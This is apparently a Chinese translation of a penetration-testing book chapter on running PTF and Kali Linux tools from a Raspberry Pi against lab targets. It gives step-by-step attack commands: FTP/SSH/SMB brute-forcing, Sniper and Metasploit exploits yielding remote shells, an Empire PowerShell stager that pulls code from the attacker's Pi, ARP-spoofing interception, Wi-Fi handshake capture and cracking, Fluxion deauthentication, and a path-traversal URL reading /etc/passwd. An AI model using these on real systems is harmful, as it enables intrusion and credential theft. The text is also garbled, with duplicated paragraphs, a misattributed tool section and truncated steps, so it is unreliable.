PTF 包含了许多流行的安全工具，你也可以添加新的或自定义的工具（在 PTF 演示视频中讨论过）。我们将查看其中几个，并展示一些用法示例。但首先，安装将花费非常长的时间，所以现在是起身去做点其他事情的好时机。只需定期检查即可，你可能需要等一会儿。

---

本章将使用 Raspberry Pi 3b+ 和 Raspbian。它在 Pi 4 上的用法完全相同。下载“Buster with Desktop”（带桌面版）版本的 Raspbian，然后进行完整更新。

- 如果需要，安装 Raspbian 的说明可以在“安装操作系统”章节中找到。
- 内存卡写入完成后（我使用 Etcher），将内存卡插入 Pi，连接上键盘、鼠标、网线和视频显示器。
- 最后，接通 Pi 的电源。
- 按照启动时的桌面设置向导进行操作，并执行完整更新。

### 安装 PTF

安装并更新好 Raspbian 之后，下一步是安装 PTF。我强烈建议读者观看工具作者提供的 PTF 演示视频（链接在章节开头）。由于此视频涵盖了许多 PTF 主题，我们将快速跳过。PTF 由分类分类模块组成。你可以安装单个 PTF 模块或安装所有模块。如果你想对 PTF 进行全量安装，你需要一张 32 GB 的卡。全量安装在 Pi 上也可能需要几个小时。

注意： 某些在 Raspbian Stretch 上运行良好的 PTF 工具，似乎在 Raspbian Buster 上运行时存在问题，希望未来的更新能修复这些问题。

在 Raspbian 终端中操作：

- 输入 `sudo su`
- 接下来，执行 `git clone https://github.com/trustedsec/ptf/`
- 最后，执行 `cd ptf`

如下所示：

![](img/00047.gif)

现在启动 ptf：

- 输入 `./ptf`
- 在 `ptf>` 提示符下，输入 `show modules`

你将看到 PTF 所有可用的模块列表。你可以逐个安装。如果你有一个 32GB 的内存卡，可以安装所有模块：

- 使用 `modules/install_update_all`

![](img/00048.gif)

PTF 包含了许多流行的安全工具，你也可以添加新的或自定义的工具（在 PTF 演示视频中讨论过）。我们将查看其中几个，并展示一些用法示例。但首先，安装将花费非常长的时间，所以现在是起身去做点其他事情的好时机。只需定期检查即可，你可能需要等一会儿。

### 使用 NMAP 扫描

Nmap 是网络扫描的首选工具。它可以扫描网络并返回哪些系统在线、端口开启以及它们运行哪些服务。它也可以通过 nmap 脚本作为攻击。

在 Raspbian 终端（或通过 SSH/Putty 连接）：

- 输入 `nmap -h` 查看选项

对于快速扫描，只需输入 nmap 命令后加上目标 IP：

```bash
nmap [target_ip]
```

这显示目标在线：

![](img/00051.gif)

我们可以通过添加 `-A` 获取服务信息：

```bash
nmap -A [target_ip]
```

这将需要更长时间，但会显示服务版本：

```bash
nmap -A [target_ip]
```

你也可以添加 `-v` 或 `-vv` 来获取详细输出：

```bash
nmap -v [target_ip]
nmap -vv [target_ip]
```

我们可以使用 `-p` 扫描单个端口：

```bash
nmap -p 21 [target_ip]
```

我们可以扫描端口范围：

```bash
nmap -p 21-25 [target_ip]
```

我们还可以使用 nmap 脚本尝试暴力攻击：

```bash
nmap --script ftp-brute -p21 [target_ip]
```

### Metasploit 的 FTP 扫描器

如果我们想扫描整个网络，并只寻找运行某些服务的系统呢？一种方法是使用 Metasploit 的扫描器。Metasploit 自带大量的扫描器。

要查看它们：

- 在终端中输入 `msfconsole` 启动 Metasploit
- 然后输入 `use auxiliary/scanner` 并按两次 `Tab` 键：

![](img/00059.gif)

我们可以使用这些任何工具扫描目标网络。让我们扫描测试网络中运行的 FTP 服务器并进行版本检测。我们可以使用 `auxiliary/scanner/ftp/ftp_version` 扫描器来实现：

- `use auxiliary/scanner/ftp/ftp_version`
- `set RHOSTS 172.24.1.200-220`
- `run`




我们在 Metasploit 中使用 `FTP_Version` 扫描器，并将其设置为扫描 `172.24.1.200` 到 `172.24.1.220` 的所有系统。你可以设置任何喜欢的范围。当此模块运行时，你应该看到如下界面：

images/0060.gif

Metasploit 扫描了一个地址范围，并成功检测到 Metasitable 机器上运行的 `vsFTP 2.3.4` 服务。在上一个主题中我们恢复了 FTP 登录凭据，我们可以使用这些工具登录单个 FTP 服务器或所有 FTP 服务器，使用 `scanner/ftp_login` 模块。

- 输入 `back`
- 然后，`use auxiliary/scanner/ftp_login`

如果你愿意，可以输入 `show options` 来查看可以填充的选项。你可以将 `RHOSTS` 设置为一个范围，尝试登录范围内的所有 FTP 服务器。在本示例中，我们将使用单个系统。

- `set RHOSTS 172.24.1.218`
- `set USERNAME user`
- `set PASSWORD user`
- `run`

images/0061.gif

登录成功！如果同一网络中有许多 FTP 服务器，我们可以通过简单地将 `RHOSTS` 值更改为整个网络的范围，然后重新运行该模块。如下例所示：

images/0062.jpeg

这只是 Metasploit 的一个模块示例，花点时间查看其他模块。只需 `use` 该模块并输入 `show options` 查看需要设置的内容。一旦设置好选项，像我们这样运行它们。Metasploit 非常强大，具有许多功能。我在其他书中深入地介绍了它。让我们来看看其他自动化攻击工具。

### Brutex

工具作者：xer0dayz

工具网站：[`github.com/1N3/BruteX`](https://github.com/1N3/BruteX)

Brutex 是一种自动化攻击工具，使用用户名/密码组合暴力破解所有端口。我们将使用 Metasitable 系统并目标指向 SMB 端口 `445`。

- `cd /pentest/exploitation/brutex`
- `sudo brutex 172.24.1.218 445`

images/0063.jpeg

短时间后，你应该看到：

images/0064.gif

你也可以通过逗号组合它们来攻击多个端口/服务：

- `sudo brutex 172.24.1.218 22,23`

上面的命令将导致 `BruteX` 目标 SSH 和 Telnet 端口，短时间后，你应该看到如下结果：

images/0065.jpeg

此工具具有更多选项和功能。例如，你可以进行 OS 检测、IDS 规避并执行我们在 Metasploit 中过的扫描类型攻击。花几分钟阅读工具的帮助界面以了解它的完整能力。

### Sniper

工具作者：xer0dayz

工具网站：[`github.com/1N3/Sniper`](https://github.com/1N3/Sniper)

Sniper 已迅速成为我最喜欢的工具之一。它是来自同一作者的另一个自动化攻击工具，但这个工具具有更多功能。专业版本（不包含）已成为许多专业渗透人员的首选工具。

如果未安装 Sniper，在终端中输入：

- `sudo git clone https://github.com/1N3/Sniper.git`
- `cd Sniper`
- `sudo ./install.sh`

运行：

- 输入，`sudo sniper -t 172.24.1.218 -b`

`-t` 告诉 Sniper 要攻击哪个目标，`-b` 开关启用暴力破解攻击。这就是你需要的所有，Sniper 将开始对目标进行完全自动化且定制的攻击。它将检查哪些端口是打开的，然后根据检测到的漏洞或服务版本对这些端口尝试特定攻击。正如俗所说，“事实检验真金”，你可以从下面的截图看到，它运行得非常好——Sniper 发现了一个漏洞并利用了它，将我们带入了目标的远程 shell。

images/0066.gif

它看起来像暂停了，但我们已经有了远程 shell。输入 `whoami` 系统将做出响应。如下：

images/0067.gif

破解密码非常简单。

images/0068.gif

### Metasploit 配合 Elasticsearch

我们在 Metasploit 中使用 `exploit` 来…………我们使用：

- `msfconsole`
- `exploit`
- `use exploit/linux/http/elasticsearch_search_rce`
- `set RHOST 172.24.1.114`
- `set RPORT 4444`
- `exploit`

如下例所示：

images/0069.jpeg

### EMPIRE-PS

工具作者：xer0dayz

工具网站：[`github.com/1N3/BruteX`](https://github.com/1N3/BruteX)



在主菜单中，你会看到列出的状态页面，显示我们有 1 个活跃的监听器（listener）。现在我们只需要构建一个负载启动器（payload stager）。

### 启动负载 (Stager)

- 输入 `usestager`，空格，tab 键，tab 键

![](img/00075.gif)

这将列出所有可用的启动器。注意这里有很多选项。让我们创建一个 Windows 启动批处理文件（bat）。当批处理文件在目标机器上运行时，它将执行一个 PowerShell 命令，连接到我们的树莓派获取额外的代码，以创建一个远程代理。

- 回车，`usestager windows/launcher_bat`

- 然后输入，`info`

这将显示所有我们可以为启动器设置的选项。在本示例中，我们仅设置 `Listener` 值，但请通读其他选项。要设置 `Listener`，请使用 `set Listener` 命令并包含我们在上一步中设置的 Empire Stage 名称，在本例中为 `http`。

- 回车，`set Listener http`

如果你愿意，可以设置其他选项，包括输出文件文件名/位置。你可以运行 `info` 命令来检查你的值是否设置正确：

![](img/00076.gif)

- 完成后，输入 `generate`

![](img/00077.gif)

现在输入 `listeners` 返回到监听器提示符。你会看到我们有一个活跃的 `Listener`：

![](img/00078.gif)

现在复制生成的 `/tmp/launcher.bat` 文件并在 Windows 目标系统上运行它。如果目标系统存在漏洞，我们就获得了一个代理（agent）！

![](img/00079.gif)

注意：Windows Defender 在阻止基于 PowerShell 的威胁方面越来越强大，因此 Defender 有很大可能会检测出该脚本为恶意脚本。可以使用其他设置和启动器来绕过 Defender，但这超出了本书的范围。

- 要与代理进行交互，如如下所示，输入 `interact [agent name]`：

![](img/00080.gif)

- 输入，`sysinfo`

![](img/00081.jpeg)

如果你输入 `help agentcmds`，将获得一个可以在 shell 中调使用的命令列表：

![](img/00082.gif)

所以，如果我们使用 `whoami`，我们应该得到类似下面的结果：

![](img/00083.gif)

我们可以尝试运行 UAC 绕过；这将我们的 shell 从管理员账户（如果目标是管理员）提升到无所不能的 System 级 shell。如果运行正常，它将创建一个禁用了 UAC 的新代理。一旦你连接到新代理，你就可以运行 Mimikatz 或使用 `creds` 命令来获取用户凭据。如果你攻破的 Windows 系统没有以管理员身份运行，此操作将无效。你将看到所示所示错误：

![](img/00084.gif)

我们将在书的后后部分查看绕过 UAC 并获取系统凭据的另一种方法。

当你完成 Empire 后：

- 输入，`exit`

- 再次输入 `exit` 以关闭代理和监听器并返回到终端提示符。

### 在 PTF 中运行其他命令

我们刚刚查看了在 PTF 中运行几个命令，还有很多更多！如之前提到的，命令要么位于 `/usr/share` 目录，要么位于 `/pentest/` 目录并按类别排序。花点时间查看这些目录并尝试这些工具。某些程序可能是图形界面化的，所以如果你通过 SSH 远程使用 PTF，记住你可能需要运行 VNC 或 Xming 它们才能正常工作。

如果你在 Windows 系统上使用 Xming 和 Putty，请记住，如果需要，可以使用 `startlxde-pi` 命令通过 Xming 运行完整的桌面。这将在你的 Windows PC 上显示完整的桌面：

![](img/00085.jpeg)

好了，本章就此结束。PTF 中还有很多我们没有涵盖的工具，自己去查看一下它们吧！在下一章中，我们将查看如何在树莓派上运行 Kali Linux。

## 资源

- PowerShell Empire Listeners - [`www.powershellempire.com/?page_id=102`](https://www.powershellempire.com/?page_id=102)

# 第 4 章

## Kali Linux 树莓派

![](img/00086.jpeg)

在本章中，我们将介绍如何在树莓派 3b+ 上安装 Kali Linux。我们还将看到在该平台上运行若干 Kali 工具。由于我假设读者以前使用过 Kali Linux，目标是展示如何让树莓派快速运行起来，而不一定是展示如何运行每一个具体的工具。大多数工具的工作方式与在完整 PC 版 Kali 安装中完全一样。尽管某些工具（如 `Hashcat`）显然没有兼容 ARM 的二进制文件，并且未包含在 Kali Pi 版本中。

访问 Offensive Security ：

[`www.offensive-security.com/kali-linux-arm-images/`](https://www.offensive-security.com/kali-linux-arm-images/)

导航到 Kali ARM 镜像，然后选择 Raspberry Pi 分支。下载适用于树莓派的 Raspberry Pi 版本。由于使用的是 Pi3b+，下载 64 位版本。

镜像下载后，你需要使用 Etcher 写入你的 SD 卡：

![](img/0087.jpeg)

将卡插入树莓派，连接键盘、鼠标、网络线和视频线缆。最后接上电源。树莓派将启动并出现登录界面。

用户：`root`，密码：

在“Welcome to the”消息处，点击“Use default”。现在你将进入 Kali。花时间熟悉它。它使用 Xfce 相比与常规 Kali 略有不同，但底层是一样的。

![](img/0089.jpeg)

点击“Applications”（应用程序）按钮查看工具。目前非常空虚，我们将修复。有一些我们需要做的清理工作。

### 设置 SSH

我们首先要进行的是重新生成 SSH 密钥。

打开终端
- `cd /etc/ssh/`
- `mkdir default_keys`
- `mv ssh_host_* default_keys/`
- `dpkg-reconfigure openssh-server`

几秒钟后我们有了新的 SSH 密钥。在当前的 Kali 版本中，默认允许 root 登录。这对我们的实验没有问题，但如果你打算将其用于常规用途，需要在 `/etc/ssh/sshd_config` 中更改这一点。你还将需要使用 `passwd` 命令更改 root 密码。SSH 服务器在 Kali 安装中默认已启动，因此我们只需要 IP 地址。如果你是像我这样的老牌 Linux 用户，你可能会使用 `ifconfig`，这些过时的命令在我看来更好用且更好看，尽管现在应该使用 `ip` 命令。

- 输入 `ip a` 查看所有网络地址，或使用 `ip -4 a` 只查看 ip 4 地址。

![](img/0090.gif)

现在你可以像我们在上一章中那样使用 SSH 或 Putty 远程连接到 Kali 系统。

### TFT 显示设置

如果你为树莓派配备触摸屏，现在可以配置它。

- 在终端中输入 `kalipi-tft-config`
- 选择 `setup display` 并选择你的显示器
- 你可能需要旋转显示
- 更新 Kali 配置并重启

我们在下一章 Re4son 的 Kali-Pi 中将更多讨论 TFT 显示。

### 更新

我们要做的第一件事是全量更新。

- 输入 `apt update`
- 然后，`apt upgrade`




在提示时，允许它无需询问即可重启任何服务。在安装更新时请稍候，升级完成后请重启电脑。如果 `ExploitDB` 有更新，预计升级过程将花费很长时间——在我的安装过程中，完成 2019-1 版本大约花了一天时间，似乎是因为 `ExploitDB` 的更新。在 Kali 的一个论坛上，有人提到在升级前直接删除 `ExploitDB`，但我把这交由读者自行决定。

所有的 Kali 工具都可以通过应用程序菜单和终端使用。你会发现已安装的工具列表非常少。这是刻意为之，因为你需要安装元软件包（Metapackages）！

## 元软件包 (Metapackages)

Kali-Pi 镜像预装了一些工具。它们在 Kali 的早前版本中被称为“前 10 名”，包括 `Metasploit`、`nmap`、`Recon-NG` 等。其余的 Kali 工具可以通过 Kali “Metapackages”下载。`Metapackages` 是按功能分组的安全工具包。如果你有一张 16 GB 或更大的 SDRam 卡，并且有足够的耐心，你可以安装完整的 Kali Linux 系统。如果你不需要所有工具，可以根据你的需求只安装无线工具（`kali-linux-wireless`）或 Web 应用评估工具（`kali-linux-web`）。

所有可用的元软件包列在 Kali Metapackages 网站上：

- [`tools.kali.org/kali-metapackages`](https://tools.kali.org/kali-metapackages)

安装非常简单，在终端中只需输入 `apt install` 加上你想要的元软件包即可。你基本上有 2 个选项：可以安装完整包，也可以安装单个工具包。选项 2 的唯一缺点是某些必要的“辅助”工具可能没有安装，你可能需要手动安装它们。

### 选项 1

如果你想要安装完整的 Kali 系统：

- `apt install kali-linux-full`

这包含了普通 Kali Linux 安装中的所有工具。安装将花费很长的时间，请保持耐心。

### 选项 2

如果你想安装特定类别的工具：

取决于你对对 Kali 安装要做什么，无线工具是一个很好的选择。无线包包含了许多工具，包括用于 Wi-Fi、蓝牙和 SDR 的工具。你可以使用以下命令查看包含哪些包：

```bash
apt-cache show kali-linux-wireless |grep
```
(images/0092.gif)

如果这些是你需要的工具，请继续安装：

```bash
apt install kali-linux-wireless
```

无论你选择哪种选项，新工具在安装后都会出现在 Kali 菜单中：

(images/0093.jpeg)

任何安装选项似乎都需要几个小时，请保持耐心，并在完成后重启。下载的工具与你在普通 Kali 安装中获得的工具是**相同**的。这些不是缩水版或类似的东西。我遇到过几个工具无法工作或似乎缺失，但那是罕见情况。如果它在普通 Kali 安装中可以运行，那么在树莓派上以相同的方式做同样事情的几率也很大。所以，在漫长的安装之后，让我们玩玩吧！

## Responder

工具网站：[`github.com/lgandx/Responder/`](https://github.com/lgandx/Responder/)

`Responder` 是一个 LLMNR、NBT-NS 和 MDNS 投毒工具。基本上，`Responder` 伪装成几个基于 Windows 的服务并回答这些服务的调用。它具有获取密码哈希和可能的明文凭据的能力。当网络上有人错误输入网络共享路径时，效果最好，`Responder` 回复调用并捕获用户的密码。这是一个设置非常方便的工具。





![](img/00102.jpeg)

Rockyou.txt 是破解时常用的字典文件。`-o` 参数是我们的输出文件，命令末尾的 `-O` 基本上只是 `Hashcat` 的速度设置。这可以破解一部分密码，但要破解剩下的部分（有些具有挑战性），你需要尝试规则和不同的字典。一旦你破解了密码，就可以将它们用于 Metasploit 等自动化攻击扫描器，以可能获得进一步的访问权限。我在本书的其他部分介绍了这一点，并在我的其他书中进行了详细介绍。让我们再次转换思路，看看一个在树莓派的 Kali 上运行非常良好的最新工具。

## Bettercap 2

工具网站：[`github.com/bettercap/bettercap`](https://github.com/bettercap/bettercap)

工具 Wiki：[`www.bettercap.org/`](https://www.bettercap.org/)

Bettercap 已经经过了完全重构，基本上是一个用于网络扫描和中间人（MitM）攻击的全新工具。新版本可以从控制台交互式运行，也可以通过命令行使用多个开关运行，或者使用名为 `caplets` 的脚本运行。我们将快速介绍如何使用 Bettercap 并演示一些现场示例。

### 快速扫描

- 输入 `bettercap -iface eth0`

- 或者输入 `bettercap -face wlan0`，取决于你想监控哪个接口。当执行此命令时，检测到的系统将以“endpoints”（终端）的形式显示，并列出 IP 和 MAC 地址。

- 输入 `help` 获取上下文帮助并查看可用命令。

注意 `net.recon` 模块正在运行：

![](img/00103.gif)

你可以输入 `help net.recon` 查看该模块的帮助信息，或者通过输入 `net.recon on` 或 `net.recon off` 来开启或关闭该模块。你可以输入 `net.show` 查看通过 Bettercap 被动扫描检测到了哪些系统：

![](img/00104.jpeg)

### 运行主动扫描：

- 输入 `net.probe on`
- 等待几秒
- 然后输入 `net.show`

![](img/01005.jpeg)

通过主动扫描，它能够检测到一个额外的系统，一个 Android 设备。

如果你输入 `help`，你会看到 `net.probe` 模块仍在运行：

![](img/00106.gif)

使用 `net.probe off` 将其关闭。

### ARP 欺骗中间人攻击

我们可以针对单个计算机进行 ARP 欺骗。将在目标系统和路由器之间创建一个中间人攻击，这样我们就可以看到目标在线访问的所有地方。

- 输入 `help arp.spoof`

![](img/00107.gif)

我们只需要设置 `arp.spoof.targets` 配置。使用 `set` 命令进行设置，使用 `get` 命令查看当前设置。我们可以输入单个 IP、IP 列表或整个子网。在使用这一这种策略之前，理解你正在做什么是非常重要的。将高使用率子网的所有流量重定向到单个树莓派并不是一个好主意。这就是为什么在真实环境中使用它们之前，理解你的工具和技术很重要。

在这个示例中，我将针对网络中 IP 为 `172.24.1.238` 的 Windows 10 系统进行攻击：

- `set arp.spoof.targets 172.24.1.238`
- `get arp.spoof.targets`

![](img/0108.jpeg)

它正确显示了单个目标。现在启动 `arp.spoof`：

- `arp.spoof on`

![](img/109.gif)

然后开启 `net.sniff on`：

- `net.sniff on`

![](img/110.gif)

现在，在目标系统上开始浏览网页。随后你应该会在 Bettercap 中看到目标浏览的所有地方。完成后关闭模块：

![](img/111.gif)

### Bettercap Caplets

[`github.com/bettercap/caplets`](https://github.com/bettercap/caplets)

Caplets 基本上就是 Bettercap 脚本。你可以从命令行调用 caplets，它运行这些命令的方式就像你手动输入信息一样。

所以，如果我们想启动 bettercap 并立即开始扫描：

- `bettercap -iface eth0 -caplet netmon.cap`

这里有一些非常有趣的脚本，花点时间去看看。

### Bettercap Wi-Fi 扫描器

我测试 Wi-Fi 安全的新宠儿工具是 Bettercap！最新版本增加了 Wi-Fi 扫描和新的 PMKID 无客户端攻击。整个过程可以在下处找到：[`www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-less-attack/`](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-less-attack/)

所以，除了快速演示外，我们不会在这上面花费任何时间。它似乎无法与内置无线适配器配合，因此你需要使用你的 USB Wi-Fi 适配器。

退出 Bettercap 并使用以下命令重启：

- `bettercap -iface wlan1`
- `wifi.recon on`
- `set wifi.show.sort desc`
- `set ticker.commands 'clear; wifi.show'`
- `ticker on`

![](img/0112.jpeg)

找到你想要的目标路由器通道，并使用以下命令锁定它：

- `wifi.recon.channel X`（输入通道号）

现在你可以生成一个关联请求并将其发送到通道内的每个路由器：

- `wifi.assoc all`

如果路由器容易受到这种类型的攻击，它们将返回一个握手文件。任何捕获的握手都存储在根目录下，只需进行转换。可以使用以下命令完成：

- `hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap`

![](img/1113.gif)

你现在可以将生成的 `bettercap-wifi-handshakes.pmkid` 文件拷贝到普通的 Kali Linux 系统上，并使用以下 hashcat 命令尝试破解握手文件：

- `hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'`

### Bettercap 低功耗蓝牙 (BLE)

最后，你还可以使用 Bettercap 检测并与低功耗蓝牙 (BLE) 设备交互。

- 使用 `ble.recon on` 开启蓝牙扫描器

![](img/0114.gif)

然后你可以使用 `ble.show` 查看检测到的任何设备，使用 `ble.enum` & `ble.write` 与蓝牙设备交互。

![](img/0115.jpeg)

破解蓝牙设备超本书的范围，将在我即将出版的《高级 Kali》书中介绍。交互式运行 Bettercap 非常有趣，特别是当你正在学习它的功能时。但使用 `caplets` 大大增加了易用性并提供了攻击自动化。

### Bettercap 未来功能

Bettercap 新的 `Hydra` 图形用户界面看起来极棒。在写作时它仍在开发中，而且似乎无法在树莓派的 Kali 上运行。一定要关注它，这将是 Bettercap 的一个强大补充！

- [`github.com/bettercap/hydra`](https://github.com/bettercap/hydra)

在本书印刷时发布的最新版本 Bettercap 现在还包含了 Google 地图类型的定位功能！

## OWASP ZAP - 应用程序测试

OWASP Zed Attack Proxy (ZAP) 或 ZaProxy 是一种 Web 扫描和测试工具，可供安全人员和人员使用。你可以用 ZAP 做很多事情；我们将只介绍一些安全测试常用的功能。

- 启动你的 Metasploitable2 虚拟机
- 然后在 Kali 中，导航到应用程序菜单中的“03 – Web Application Analysis/ Owasp-Zap”

![](img/0116.jpeg)




当你启动程序时，系统会询问你是否要“持久 ZAP 会话”。这将存储活动会话，以便你以后返回它。现在，只需选择“no, I do not want to persist this session at this moment in time”并点击“start”：

![](img/00117.jpeg)

随后你将看到主界面。如你所见，屏幕分为三个不同的区域：左上角的 `Sites` 窗口，右上角的快速启动/请求/响应窗口，以及底部的消息框。

## 快速扫描与攻击

要快速开始行动，只需在 `URL to attack` 输入框中输入目标地址（Metasploitable2 系统上的 Mutillidae），然后点击 `Attack` 按钮。

-   输入 `http://172.24.1.218/mutillidae/`，然后点击 `Attack`

![](img/00118.jpeg)

这将对整个目标网站进行爬虫并扫描漏洞。扫描进度和发现的页面将在底部窗口显示。完成后，按下 `Alerts` 查看该网站的任何安全问题：

![](img/00119.jpeg)

如你所见，ZAP 发现了网站的多个问题。每个文件夹包含不同类型的安全问题。现在，让我们先检查第一个告警，`Path Traversal`（路径遍历）文件夹。点击将其展开，然后点击第一个告警：

![](img/00120.jpeg)

在右侧，你将看到可能存在问题的页面以及风险级别：

![](img/00121.gif)

OWASP ZAP 还解释了该错误：

“路径遍历攻击技术允许攻击者访问可能位于 Web 文档根目录之外的文件、目录和命令。攻击者可以操纵 URL，使网站执行或显示 Web 服务器上任何位置任意文件的内容。任何暴露基于 HTTP 接口的设备都可能受到路径遍历攻击……

…… 最基本的路径遍历攻击使用 `../` 特殊字符序列来更改 URL 中请求的资源位置。虽然大多数流行的 Web 服务器防止这种技术逃离 Web 文档根目录，但 `../` 序列的替代编码可能绕过安全过滤器。这些方法变体包括斜杠字符的有效和无效 Unicode 编码 (`..%u2216` 或 `..%c0%af`）、Windows 基础服务器上的反斜杠字符 (`..\\`)、URL 编码字符 (`%2e%2e%2f`) 以及反斜杠的双重 URL 编码 (`..%255c`)。”

基本上，这意味着我们通过使用特殊序列就可以查看 Web 服务器上的文件或文件夹。OWASP ZAP 给了我们要输入的精确命令：

`http://172.24.1.218/mutillidae/?page=%2Fetc%2Fpasswd`

上述 HTTP 地址将利用 Metasploitable 服务器上的一个漏洞网页。如果我们在 Kali 系统的 Web 浏览器中输入此 URL，它将访问 Metasploitable 服务器并调出一个特定的网页，`?page=` 部分后面跟着要显示的网页。

告警中请求的页面是 `%2Fetc%2Fpasswd`。现在这看起来可能没什么特别，但如果你熟悉 Linux（以及编码），该命令就变成了 `/etc/passwd`，这正是服务器密码文件的位置！

在 Web 浏览器中输入整个网页地址将返回如下：

![](img/00122.jpeg)

你看到一个看起来像正常的网页，但如果你查看中间窗口，就会看到这些信息：

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:100:101::
```

你看到一个看起来像正常的网页，但如果你查看中间窗口，就会看到这些信息：

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:100:101::
```

基本上，这意味着我们通过使用特殊序列就可以查看 Web 服务器上的文件或文件夹。OWASP ZAP 给了我们要输入的精确命令：

`http://172.24.1.218/mutillidae/?page=%2Fetc%2Fpasswd`

上述 HTTP 地址将利用 Metasploitable 服务器上的一个漏洞网页。如果我们在 Kali 系统的 Web 浏览器中输入此 URL，它将访问 Metasploitable 服务器并调特定的网页，`?page=` 部分后面跟着要显示的网页。

告警中请求的页面是 `%2Fetc%2Fpasswd`。现在这看起来可能没什么特别，但如果你熟悉 Linux（以及编码），该命令就变成了 `/etc/passwd`，这正是服务器密码文件的位置！

在 Web 浏览器中输入整个网页地址将返回如下：

![](img/00122.jpeg)

你看到一个看起来像正常的网页，但如果你查看中间窗口，就会看到这些信息：

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:100:101::
```

你看到一个看起来像正常的网页，但如果你查看中间窗口，就会看到这些信息：

## Fluxion 攻击

## 安装
-   `git clone https://www.github.com/FluxionNetwork/fluxion.git`
-   `cd fluxion`
-   `./fluxion.sh`

### 使用

Fluxion 使用了其他工具。运行时它会检查你是否安装了所有依赖项。如果没有，它会提示你使用 `./fluxion.sh -I` 安装它们。

![](img/00123.jpeg)

选择语言后，系统提示选择一种无线攻击：

![](img/0124.jpeg)

-   选择 `2` 进行握手嗅探 (Handshake Snooper)
-   再次选择 `2` 选择你的插入 USB 适配器
-   选择要监控的通道，使用 `1 – All channels (2.4GHz)`，除非你的 Wi-Fi 卡支持 5GHz

![](img/00125.gif)

-   打开一个新窗口，在看到目标 AP 后让其运行 5 秒，然后在窗口中按下 `Ctrl-c`。
-   你将看到检测到的所有 AP。选择你要目标的 AP：

![](img/0126.gif)

-   你可以跳过目标跟踪
-   接下来选择你的握手获取方法（强制干扰客户端并强制其重新连接，这在某些国家可能是非法的）
-   完成其余提示 - 它提示你采取默认值或高亮显示的选项。

当准备就绪时，会打开额外的窗口并开始监听握手文件：

![](img/00127.jpeg)

攻击成功后，你将收到通知。




Fluxion 在大多数时候在 Pi 上运行得都很良好，但有时会随机出现反应的情况。如前所述，在 Kali 中运行某些工具有时可能具有挑战性，在 Raspberry Pi 版本上更是如此。即使是运行系统更新这样简单的操作，也可能破坏某些之前运行良好的工具。请检查工具作者的论坛获取问题，当然，Google 也是你的朋友。使用 Pi 时我最好的建议是，当一切运行正常后冻结你的软件版本，并一直使用到绝对需要更新为止。

## 安全 Kali-Pi 投递箱 (Drop Boxes)

Kali 网站有一篇关于如何使用 Pi 创建“安全投递箱”的文章。这些是独立的加密 Raspberry Pi，作为渗透测试人员，你可以将它们留存在物理现场。由于这些信息可能会让防御团队更难破解 Pi 上的内容，我将不再涵盖这部分，但你可以在这里找到 Kali 的文章：

[`www.kali.org/tutorials/secure-kali-pi-2018/`](https://www.kali.org/tutorials/secure-kali-pi-2018/)

## 如何在 Windows 中获取远程图形显示

你可以使用 Xming 在 Windows 上获取远程 Kali 图形界面，但指令说明包含几个额外的步骤。

设置 `putty` 连接以启用 x11 转发：

- 在 Session（会话）下输入目标 IP
- 然后点击 SSH，然后点击 X11
- 勾选“Enable X11 forwarding”（启用 X11 转发）框
- 在 x display location 框中输入 `localhost:0`如下所示：

![](img/00129.jpeg)

创建一个 Kali 用户，将 username 替换为新用户的名称：

